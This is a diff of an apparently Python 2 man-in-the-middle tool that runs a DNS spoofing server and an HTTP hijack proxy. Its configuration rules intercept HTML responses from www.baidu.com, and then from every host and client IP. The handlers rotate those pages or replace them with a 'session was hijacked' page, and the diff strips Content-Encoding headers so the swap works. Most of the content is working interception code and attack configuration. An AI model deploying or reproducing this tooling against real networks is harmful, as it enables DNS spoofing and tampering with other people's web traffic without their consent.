@@ -16,6 +16,7 @@ def run_server(SevClass, setting):
 
 
 def clear_cache(proxyhandler, req):
+	print 'clear_cache'
 	pass
 
 def rotate_html(proxyhandler, req, res):
@@ -44,9 +45,11 @@ def rotate_html(proxyhandler, req, res):
 			pass
 
 def response_mypage(proxyhandler, req, res):
-	print 'res'
 	print req.raw_firstline
+	# res.do_unzip()
 	res.databody = "<!doctype html><html><body><center>You's session was hijacked!</center></body></html>"
+	if 'Content-Encoding' in res.headers:
+		del res.headers['Content-Encoding']
 
 
 setting = {
@@ -76,35 +79,39 @@ setting = {
 		},
 		'logging':{
 			'file':'http.log',
-			'console':True,
+			'console':False,
 		},
 		'hijacks':(
+
+			# rule 1
 			{
-				'host':'www.baidu.com',
-				'path':'.*',
-				'method':'GET',
-				'ip':'172.16.0.1[0-9]0',
-				'request':{
+				'host':'www.baidu.com',	# when host is www.baidu.com
+				# 'path':'.*',	# all path
+				# 'method':'.*',	# all method, GET POST PUT ...
+				# 'ip':'172.16.0.10[0-9]',	# hijack 172.16.0.100-172.16.0.109 's session
+				'request':{	# before request to http server
 					# 'headers':{	# and
 					# },
 					'handler': clear_cache,
 				},
-				'response':{
+				'response':{	# after response from http server
+					# 'code':'200',	# status code
 					'headers':{ # and
-						'Content-Type':'.*html.*'
+						'Content-Type':'.*html.*'	# only html response will be hijacked
 					},
-					'handler':rotate_html,
+					'handler':rotate_html,	# rotate 90 deg
 				},
 			},
 
+			# rule 2
 			{
-				'host':'.*',
-				'path':'.*',
+				'host':'.*',	# all host
+				'path':'.*',	
 				'method':'.*',
 				'ip':'.*',
 				'response':{
 					'headers':{ # and
-						'Content-Type':'.*html.*'
+						'Content-Type':'.*html.*'	# only hijack html type response
 					},
 					'handler': response_mypage,	# response a hijacked page
 				},
@@ -119,14 +126,27 @@ setting = {
 
 if __name__ == '__main__':
 	import time
-	t = threading.Thread(target=run_server, args=(DNSSpoofingServer, setting['dnsspoofing']))
-	t.start()
-	# t.join()
+	if type(setting['dnsspoofing']) == type({}):
+		cfg = setting['dnsspoofing']
+		t = threading.Thread(target=run_server, args=(DNSSpoofingServer, cfg))
+		t.start()
+		time.sleep(0.5)
+	else:
+		for cfg in setting['dnsspoofing']:
+			t = threading.Thread(target=run_server, args=(DNSSpoofingServer, cfg))
+			t.start()
+			time.sleep(0.5)
 
-	time.sleep(0.5)
-	t = threading.Thread(target=run_server, args=(HttpHijackServer, setting['httphijack']))
-	t.start()
-	# t.join()
+	if type(setting['httphijack']) == type({}):
+		cfg = setting['httphijack']
+		t = threading.Thread(target=run_server, args=(HttpHijackServer, cfg))
+		t.start()
+		time.sleep(0.5)
+	else:
+		for cfg in setting['httphijack']:
+			t = threading.Thread(target=run_server, args=(HttpHijackServer, cfg))
+			t.start()
+			time.sleep(0.5)
 	while True:
 		time.sleep(1)
 
